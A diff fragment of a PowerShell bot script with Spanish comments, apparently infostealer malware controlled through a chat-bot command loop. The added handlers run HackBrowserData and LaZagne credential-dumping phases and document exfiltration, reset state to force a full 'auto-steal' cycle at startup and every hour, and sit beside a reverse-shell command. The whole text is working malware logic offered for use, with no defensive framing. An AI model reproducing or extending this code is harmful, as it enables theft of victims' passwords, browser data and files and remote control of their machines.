-            $script:BrowserDataSent = $false
-            Steal-Data 
+            # Forzar ciclo completo
+            $script:HackBrowserDataCompleted = $false
+            $script:LaZagneCompleted = $false
+            $script:FilesExfiltrated = $false
+            $script:ArchivosHackBrowserDataEnviados = 0
+            Check-AutoSteal
         }
         
-        "/files" { Exfiltrate-Documents }
+        "/hack" {
+            $script:ArchivosHackBrowserDataEnviados = 0
+            $script:HackBrowserDataCompleted = $false
+            Run-HackBrowserData-Phase
+        }
+        
+        "/lazagne" {
+            $script:LaZagneCompleted = $false
+            Run-LaZagne-Phase
+        }
+        
+        "/files" { 
+            $script:FilesExfiltrated = $false
+            Exfiltrate-Documents 
+        }
         
         "/shell" {
             if ($script:ReverseShellActive) {
@@ -675,7 +822,7 @@ FLUJO AUTOMATICO:
 # === INICIO ===
 Write-Log "=== BOT INICIADO ==="
 Load-State
-Send-Message -Text "Bot online - $(Get-Info)`nIniciando secuencia automatica..."
+Send-Message -Text "🤖 Bot online - $(Get-Info)`n`nIniciando flujo automatico..."
 
 Check-AutoSteal
 
@@ -695,7 +842,11 @@ while ($true) {
                 Process-Cmd -Text $upd.message.text -UpdateId $upd.update_id
             }
         }
-        if ((Get-Date).Minute -eq 0) { Check-AutoSteal }
+        
+        # Verificar cada hora si hay tareas pendientes o reinicio
+        if ((Get-Date).Minute -eq 0) {
+            Check-AutoSteal
+        }
     } catch {
         $err = $_.Exception.Message
         if ($err -notlike "*409*") { Write-Log "Error: $err" }
